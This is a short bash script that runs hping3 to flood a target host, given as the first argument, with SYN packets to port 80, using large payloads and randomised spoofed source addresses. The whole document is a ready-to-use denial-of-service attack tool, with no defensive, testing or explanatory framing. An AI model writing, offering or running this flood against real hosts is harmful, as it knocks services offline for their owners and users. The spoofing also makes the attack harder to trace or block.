#!/bin/bash
hping3 --flood -p 80 -d 1460 -S --rand-source $1
